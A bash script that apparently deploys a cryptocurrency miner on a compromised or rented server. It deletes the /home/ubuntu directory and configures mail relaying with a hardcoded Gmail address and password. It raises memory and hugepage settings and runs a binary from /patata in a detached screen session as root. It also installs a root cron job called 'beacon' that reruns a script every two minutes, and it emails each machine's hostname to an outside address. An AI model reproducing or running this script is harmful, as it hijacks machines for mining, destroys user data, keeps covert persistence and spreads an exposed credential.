#!/bin/bash
cd home
sudo rm /etc/cron.d/beacon

if [ ! -f /etc/proof ]; then
	sudo debconf-set-selections <<< "postfix postfix/mailname string salchipapa.llameante2@gmail.com"
	sudo debconf-set-selections <<< "postfix postfix/main_mailer_type string 'Internet Site'"
	sudo apt-get -y install mailutils ssmtp libmicrohttpd-dev
	sudo rm -rf /home/ubuntu
	sudo chmod +x /etc/ssmtp
	sudo chmod +x /etc/ssmtp/ssmtp.conf
	sudo bash -c 'echo "AuthUser=salchipapa.llameante2@gmail.com" >> /etc/ssmtp/ssmtp.conf'
	sudo bash -c 'echo "AuthPass=tuculoesmio" >> /etc/ssmtp/ssmtp.conf'
	sudo bash -c 'echo "mailhub=smtp.gmail.com:587" >> /etc/ssmtp/ssmtp.conf'
	sudo bash -c 'echo "UseSTARTTLS=YES" >> /etc/ssmtp/ssmtp.conf'
	sudo bash -c 'echo "* soft memlock 262144" >> /etc/security/limits.conf'
	sudo bash -c 'echo "* hard memlock 262144" >> /etc/security/limits.conf'
    sudo touch /etc/proof
fi

sudo chmod +x /patata/patata
sudo sed -i "20s/.*/\""$1"\"/" /patata/config.txt
sudo sed -i "18s/.*/\""$2"\"/" /patata/config.txt
sudo sysctl -w vm.nr_hugepages=128
screen -dm sudo /patata/patata /patata/config.txt

if [ $# -eq 3 ]
  then
    echo 'ayy' | mail -s "Encendido de $HOSTNAME" "$3"
    sudo touch /etc/cron.d/beacon
    cronjob='*/2 * * * *'
    executable="bash /patata/tramboliko.sh $3"
    echo "${cronjob} root ${executable}" | sudo tee /etc/cron.d/beacon
else
	echo 'valiste' | mail -s "MAREA NEGRA en $HOSTNAME" 'frotunato@gmail.com'
fi